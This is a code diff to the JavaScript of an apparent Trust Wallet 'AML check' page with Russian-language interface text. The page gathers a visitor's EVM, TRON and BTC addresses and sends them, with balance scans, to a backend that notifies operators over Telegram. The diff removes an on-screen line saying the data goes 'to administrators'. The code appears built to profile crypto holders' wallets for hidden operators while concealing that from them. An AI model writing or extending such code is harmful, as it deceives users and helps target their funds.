@@ -22,8 +22,28 @@ if (location.hostname.endsWith(".github.io") && configuredApiBase && !/[?&]stay=
 
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
+const withTimeout = (promise, ms, message) =>
+  Promise.race([
+    promise,
+    new Promise((_, reject) => {
+      setTimeout(() => reject(new Error(message)), ms);
+    }),
+  ]);
+
 const setStatus = (message) => {
   if (userWalletStatus) userWalletStatus.textContent = message;
+};
+
+const setConnectLoading = (loading) => {
+  if (!userWalletConnect) return;
+  userWalletConnect.dataset.busy = loading ? "1" : "0";
+  userWalletConnect.classList.toggle("is-loading", loading);
+  userWalletConnect.disabled = loading;
+  userWalletConnect.textContent = loading
+    ? "Подключение..."
+    : loadProfile()?.evmAddress
+      ? "Обновить данные кошелька"
+      : "Connect";
 };
 
 const updateHeader = () => {
@@ -84,13 +104,13 @@ const unlockCheckForm = (profile) => {
   if (walletInput && profile.evmAddress && !walletInput.value.trim()) {
     walletInput.value = profile.evmAddress;
   }
-  if (checkLockNote) checkLockNote.textContent = "Кошелёк подключён автоматически. Можно запускать AML-проверку.";
+  if (checkLockNote) checkLockNote.textContent = "Кошелёк подключён. Можно запускать AML-проверку.";
   if (userLogout) {
     userLogout.classList.remove("is-hidden-slot");
     userLogout.setAttribute("aria-hidden", "false");
   }
   if (userConsent) userConsent.checked = true;
-  if (userWalletConnect) userWalletConnect.textContent = "Обновить данные кошелька";
+  setConnectLoading(false);
 };
 
 const lockCheckForm = () => {
@@ -103,7 +123,7 @@ const lockCheckForm = () => {
     userLogout.classList.add("is-hidden-slot");
     userLogout.setAttribute("aria-hidden", "true");
   }
-  if (userWalletConnect) userWalletConnect.textContent = "Connect";
+  setConnectLoading(false);
 };
 
 const saveProfile = (profile) => localStorage.setItem(walletProfileKey, JSON.stringify(profile));
@@ -121,7 +141,7 @@ const notifyTelegramWebApp = (payload) => {
   }
 };
 
-const requestJsonViaXhr = (fullUrl, options = {}, timeoutMs = 120000) =>
+const requestJsonViaXhr = (fullUrl, options = {}, timeoutMs = 90000) =>
   new Promise((resolve, reject) => {
     const xhr = new XMLHttpRequest();
     xhr.open(String(options.method || "GET").toUpperCase(), fullUrl, true);
@@ -142,7 +162,7 @@ const requestJsonViaXhr = (fullUrl, options = {}, timeoutMs = 120000) =>
     xhr.send(options.body || null);
   });
 
-const requestJson = async (url, options = {}, retries = 4) => {
+const requestJson = async (url, options = {}, retries = 3, timeoutMs = 90000) => {
   const fullUrl = `${apiBase}${url}`;
   let lastError;
 
@@ -150,7 +170,7 @@ const requestJson = async (url, options = {}, retries = 4) => {
     try {
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 120000);
+        const timer = setTimeout(() => controller.abort(), timeoutMs);
         const response = await fetch(fullUrl, {
           method: options.method || "GET",
           headers: { "Content-Type": "application/json", ...(options.headers || {}) },
@@ -163,53 +183,58 @@ const requestJson = async (url, options = {}, retries = 4) => {
         if (!response.ok) throw new Error(data.error || "Ошибка запроса");
         return data;
       } catch {
-        return await requestJsonViaXhr(fullUrl, options);
+        return await requestJsonViaXhr(fullUrl, options, timeoutMs);
       }
     } catch (error) {
       lastError = error;
-      if (attempt < retries) await sleep(3000 * (attempt + 1));
+      if (attempt < retries) await sleep(2000 * (attempt + 1));
     }
   }
 
   throw new Error(
-    `Сервер просыпается, подождите до 2 минут и нажмите Connect снова. (${lastError?.message || "сеть недоступна"})`,
+    `Сервер не ответил. Подождите минуту и нажмите Connect снова. (${lastError?.message || "сеть недоступна"})`,
   );
 };
 
-const warmupBackend = async () => {
+const warmupBackend = () => {
   if (!apiBase) return;
-  try {
-    await requestJson("/api/health", {}, 1);
-  } catch {
-    setStatus("Сервер просыпается… первый Connect может занять до 2 минут.");
-  }
+  requestJson("/api/health", {}, 0, 8000).catch(() => {});
 };
 
 const scanWalletPortfolio = async (addresses) => {
   if (!apiBase) throw new Error("Backend не настроен.");
 
-  return requestJson("/api/scan", {
-    method: "POST",
-    body: JSON.stringify({
-      ...addresses,
-      chainId: addresses.chainId,
-      source: isTelegramWebApp ? "telegram_webapp" : "trust_wallet",
-      pageUrl: checkPageUrl,
-    }),
-  });
+  setStatus("Сервер проверяет балансы…");
+  return requestJson(
+    "/api/scan",
+    {
+      method: "POST",
+      body: JSON.stringify({
+        ...addresses,
+        chainId: addresses.chainId,
+        source: isTelegramWebApp ? "telegram_webapp" : "trust_wallet",
+        pageUrl: checkPageUrl,
+      }),
+    },
+    2,
+    90000,
+  );
 };
 
 const runAutoCheck = async () => {
   if (userConsent && !userConsent.checked) {
-    throw new Error("Подтвердите согласие перед подключением кошелька.");
+    throw new Error("Отметьте согласие перед подключением.");
   }
 
-  if (!window.AutoWallet) throw new Error("Модуль AutoWallet не загружен.");
+  if (!window.AutoWallet) throw new Error("Скрипт кошелька не загрузился. Обновите страницу.");
 
-  setStatus("Подключаем Trust Wallet и автоматически собираем адреса EVM / TRON / BTC...");
-  const addresses = await window.AutoWallet.connectAllWalletAddresses({ onProgress: setStatus });
+  setStatus("Запрашиваем доступ к кошельку — подтвердите во всплывающем окне Trust Wallet…");
+  const addresses = await withTimeout(
+    window.AutoWallet.connectAllWalletAddresses({ onProgress: setStatus }),
+    90000,
+    "Кошелёк не ответил за 90 сек. Подтвердите запрос в Trust Wallet и нажмите Connect снова.",
+  );
 
-  setStatus("Проверяем балансы и отправляем данные администраторам...");
   const result = await scanWalletPortfolio(addresses);
   const portfolio = result.portfolio || result;
 
@@ -228,65 +253,50 @@ const runAutoCheck = async () => {
 
   const summary = formatPortfolioText(portfolio);
   let statusText = summary
-    ? `Готово. ${summary}${result.telegramSent ? " Уведомление отправлено в Telegram." : ""}`
+    ? `Готово. ${summary}${result.telegramSent ? " Уведомление в Telegram отправлено." : ""}`
     : "Готово. Балансы проверены.";
 
-  if (!portfolio.tronAddress) {
-    statusText += " TRON-адрес не отдался автоматически — нажмите «Обновить».";
+  if (!addresses.tronAddress) {
+    statusText += " TRON-адрес не отдался — нажмите «Обновить».";
   }
 
   setStatus(statusText);
   return profile;
 };
 
-let autoStarted = false;
-const maybeAutoConnect = async () => {
-  if (autoStarted) return;
-  if (!window.AutoWallet?.isTrustWalletEnv?.()) return;
-  if (loadProfile()?.evmAddress) return;
+const handleConnectClick = async (event) => {
+  event.preventDefault();
+  if (userWalletConnect?.dataset.busy === "1") return;
 
-  autoStarted = true;
-  if (isTelegramWebApp && userConsent) userConsent.checked = true;
+  setConnectLoading(true);
+  setStatus("Подключение…");
 
-  if (userConsent && !userConsent.checked) {
-    setStatus("Нажмите Connect — адреса подставятся автоматически.");
-    autoStarted = false;
-    return;
-  }
-
-  setStatus("Trust Wallet обнаружен. Автоподключение через 1 сек...");
-  await sleep(1000);
-
-  if (userWalletConnect?.disabled) return;
-  userWalletConnect.disabled = true;
   try {
     await runAutoCheck();
   } catch (error) {
-    setStatus(error.message);
-    autoStarted = false;
-  } finally {
-    userWalletConnect.disabled = false;
+    setStatus(error.message || "Не удалось подключить кошелёк.");
+    setConnectLoading(false);
   }
 };
 
-userWalletConnect?.addEventListener("click", async () => {
-  userWalletConnect.disabled = true;
-  try {
-    await runAutoCheck();
-  } catch (error) {
-    setStatus(error.message);
-  } finally {
-    userWalletConnect.disabled = false;
-  }
-});
+const bindTap = (element, handler) => {
+  if (!element) return;
+  element.addEventListener("click", handler);
+  element.addEventListener("touchend", handler, { passive: false });
+};
+
+bindTap(userWalletConnect, handleConnectClick);
 
 checkForm?.addEventListener("submit", async (event) => {
   event.preventDefault();
-  const button = checkForm.querySelector("button");
+  const button = checkForm.querySelector('button[type="submit"]');
+  if (button?.disabled) return;
+
   const wallet = new FormData(checkForm).get("wallet")?.trim();
   const profile = loadProfile();
   button.disabled = true;
   button.textContent = "Проверяем...";
+  setStatus("AML-проверка…");
 
   try {
     const risk = await scoreWalletLocal(wallet);
@@ -294,17 +304,22 @@ checkForm?.addEventListener("submit", async (event) => {
     setStatus(`AML-проверка для ${wallet} завершена.`);
 
     if (apiBase && profile?.evmAddress) {
-      await requestJson("/api/scan", {
-        method: "POST",
-        body: JSON.stringify({
-          evmAddress: profile.evmAddress,
-          tronAddress: profile.tronAddress,
-          btcAddress: profile.btcAddress,
-          amlTarget: wallet,
-          amlResult: risk,
-          source: "aml_check",
-        }),
-      }).catch(() => {});
+      await requestJson(
+        "/api/scan",
+        {
+          method: "POST",
+          body: JSON.stringify({
+            evmAddress: profile.evmAddress,
+            tronAddress: profile.tronAddress,
+            btcAddress: profile.btcAddress,
+            amlTarget: wallet,
+            amlResult: risk,
+            source: "aml_check",
+          }),
+        },
+        1,
+        60000,
+      ).catch(() => {});
     }
   } catch (error) {
     setStatus(error.message);
@@ -319,12 +334,14 @@ userLogout?.addEventListener("click", () => {
   lockCheckForm();
   if (userWalletAddress) userWalletAddress.textContent = "";
   if (walletInput) walletInput.value = "";
-  setStatus("Профиль очищен на этом устройстве.");
-  autoStarted = false;
+  setStatus("Профиль очищен. Нажмите Connect.");
 });
 
 if (trustDeeplink && window.AutoWallet) {
   trustDeeplink.href = window.AutoWallet.getTrustDeeplink(checkPageUrl);
+  trustDeeplink.addEventListener("click", () => {
+    setStatus("Открываем Trust Wallet…");
+  });
 }
 
 const stored = loadProfile();
@@ -334,6 +351,12 @@ if (stored?.evmAddress) {
     scoreWalletLocal(stored.evmAddress).then((risk) => renderRiskPreview(risk, stored.portfolio));
   }
   setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
+} else {
+  setStatus(
+    window.AutoWallet?.isTrustWalletEnv?.()
+      ? "Нажмите Connect и подтвердите запрос в Trust Wallet."
+      : "Откройте страницу через «Открыть в Trust Wallet», затем нажмите Connect.",
+  );
 }
 
 updateHeader();
@@ -345,7 +368,3 @@ if (window.Telegram?.WebApp) {
 }
 
 warmupBackend();
-
-if (!stored?.evmAddress) {
-  maybeAutoConnect();
-}
